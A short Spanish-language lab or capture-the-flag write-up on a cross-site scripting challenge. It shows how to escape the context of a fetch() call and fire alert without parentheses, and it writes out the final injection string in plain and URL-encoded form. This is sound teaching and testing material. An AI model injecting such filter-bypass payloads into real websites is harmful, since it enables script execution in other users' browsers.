
Filtramos por la cadena script para buscar la instruccion que hace la funcion Fetch

Debemos de encontrar la forma de salir del contexto de la funcion de fetch, añadiendo caractes que nos permitan agregar mas de un paramtro dentro de la funcion, con el fin de agregar el alert(1)

Pero vemos que nos quita los parentesis, entonces debemos de buscar alguna forma de bypassear esos parentesis del alert, para ello buscamos lo siguiente:

javascript funcion flecha la cual se puede representar de esta forma:

```javascript
<script>x=x=>{throw/**/onerror=alert,9},toString=x,window+''</script>
```

si lo ejecutamos en el navegador se muestra el alert con la exception

![](Pasted%20image%2020250711150839.png)

La cadena a inyectar seria la siguiente

```javascript
2&'},x=x=>{throw/**/onerror=alert,9},toString=x,window+'',{x:'

// Ponemos el + en formato URL encode
2&'},x=x=>{throw/**/onerror=alert,9},toString=x,window%2b'',{x:'

```

